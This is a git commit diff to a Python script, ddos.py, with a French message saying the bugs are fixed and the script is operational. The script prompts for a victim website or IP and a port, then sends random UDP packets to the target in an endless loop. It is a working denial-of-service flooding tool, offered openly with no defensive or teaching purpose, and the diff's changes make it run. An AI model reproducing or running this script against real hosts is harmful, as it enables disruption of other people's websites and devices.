a03ae0e4b5b303c5c2393162ba9fcdd71ba6bc8e
mhamedbelhachemi <mhamed79@live.fr>
2021-01-08 15:41:55 +0100

    correction de bugs, le script est operationnel

--- ddos.py
+++ ddos.py
@@ -11,23 +11,25 @@ sockt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 os.system("clear")
-os.system("echo 'DDos Attack'")
+os.system("figlet 'DDos Attack'")
 
 victim = input("enter 'w' if your victim is a website, and 'l' if it's an electronic device : ")
 if victim == 'w':
     host = input("Website you want to DDos: ")
-    ip = socket.gethostbyname( host )
+    ip = socket.gethostbyname(host)
 elif victim == 'l':
     ip = input("IP you want to DDos: ")
 else :
     print("error !")
     exit
 
-port = input("Port you want to attack: ")
+port = int(input("Port you want to attack: "))
 pers_msg = input("Enter your personnal message or signatur if you wish: ")
 
+print(ip)
+
 os.system("clear")
-os.system("echo 'DDos Attack starting...'")
+os.system("figlet 'DDos Attack starting ...'")
 while True:
     sockt.sendto(bytes,(ip,port))
-    sockt.send(pers_msg)
+    #sockt.send(bytes(pers_msg))
